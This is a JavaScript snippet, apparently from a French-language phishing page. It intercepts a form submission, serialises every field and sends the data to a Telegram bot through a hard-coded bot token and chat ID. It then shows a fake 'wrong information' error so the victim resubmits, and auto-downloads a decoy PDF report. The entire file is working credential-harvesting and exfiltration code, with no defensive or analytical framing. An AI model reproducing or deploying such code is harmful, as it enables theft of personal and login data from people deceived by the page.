const chat_id = '7529985944', botID = '7304366053:AAHqyrKbxwnv79hFMTA0E6zUWUCacm9y6sQ';
const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
// Ajouter l'URL de votre document PDF ici
const pdfURL = 'document.pdf';

$('#i983893').click(function(event) {
    $("#i983893").html("Chargement...");
    document.querySelector('#contact-form').addEventListener("submit", async e => { 
        e.preventDefault(); 
        let text = JSON.stringify( 
            Object.fromEntries(new FormData(e.target).entries()),
        null, 2); 
        const sendMessage = await fetch(telegramURL, { 
            method: 'POST',
            headers: {"Content-Type": "application/json"}, 
            body: JSON.stringify({chat_id, text}), 
        });
        const messageStatus = document.querySelector('#status');
        if (sendMessage.ok) {
            messageStatus.textContent = "Mauvaises informations !!!";
            
            // Téléchargement automatique du PDF
            const link = document.createElement('a');
            link.href = pdfURL;
            link.download = 'rapport.pdf';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
        else {
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
        }
        e.target.reset(); 
        document.getElementById("ai").focus();
        $("#i983893").html("Continuer");
    });
});
